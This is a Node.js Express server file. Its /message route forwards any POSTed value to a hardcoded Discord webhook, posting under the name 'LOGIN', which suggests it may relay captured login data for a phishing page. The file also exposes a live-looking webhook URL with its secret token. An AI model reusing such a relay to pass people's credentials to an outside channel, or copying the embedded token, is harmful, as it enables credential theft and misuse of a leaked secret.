const express = require('express')
const md5hash = require('./middleware/md5hash');
const sanitizeInput = require('./middleware/sanitizeInput');


const app = express()

async function sendWebhookMessage(message, webhook) {
  const { default: fetch } = await import('node-fetch');
  const webhookUrl = webhook;

  try {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });

    if (response.ok) {
      console.log('Message sent to the webhook successfully.');
    } else {
      console.error('Error sending message to the webhook:', response.status);
    }
  } catch (error) {
    console.error('Error sending message to the webhook:', error);
  }
}

app.all('/', (req, res) => {
    console.log("Just got a request!")
    res.send('Yo!')
})


// Apply the md5Middleware to a specific POST route
app.post('/hash', md5hash);

app.post('/message', async (req, res) => {
  
  const { value } = req.body;

  const webhookUrl = "https://discord.com/api/webhooks/1148881222261547018/eLk0DyWLT9b0GpWUQIosRwPFEfg15LZr5py5BYICP5WpNyTgJRKZXpuFd5EOXCpdmD8H";

  const message = {
    username: "LOGIN",
    avatar_url: "https://cdn.discordapp.com/attachments/1128583298562658445/1128583446952935424/ug-mkt.png",
    content: value
  };
  await sendWebhookMessage(message, webhookUrl);
  console.log(message + webhookUrl);
  
});

app.listen(process.env.PORT || 3000)